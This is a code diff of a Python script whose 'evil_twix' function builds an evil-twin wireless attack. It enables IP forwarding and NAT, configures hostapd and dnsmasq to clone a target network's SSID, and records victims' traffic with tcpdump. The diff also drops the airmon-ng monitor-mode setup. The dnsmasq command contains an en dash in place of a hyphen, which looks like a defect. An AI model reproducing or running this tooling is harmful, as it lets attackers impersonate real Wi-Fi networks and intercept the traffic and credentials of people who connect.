@@ -73,10 +73,6 @@ def get_target(interface):
 
 def evil_twix(interface, target):
 
-    # Setting interface ip address
-    os.system("airmon-ng check kill")
-    os.system("airmon-ng start %s" % interface)
-
     # Allow forwarding and put interface in ip tables
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system("iptables -I POSTROUTING -t nat -o wlan0 -j MASQUERADE")
@@ -86,13 +82,13 @@ def evil_twix(interface, target):
     os.system("cp template/template_hostapd.conf hostapd.conf")
 
     # Modifying the templates
-    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf" % (interface+"mon"))
-    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % (interface+"mon"))
+    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf" % interface)
+    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % interface)
     os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf" % target[0])
 
     os.system("dnsmasq –C dnsmasq.conf")
     os.system("hostapd hostapd.conf")
-    os.system("tcpdump -s 0 -i %s -w test.pcap" % (interface+"mon"))
+    os.system("tcpdump -s 0 -i %s -w test.pcap" % interface)
 
 if __name__ == "__main__":
     
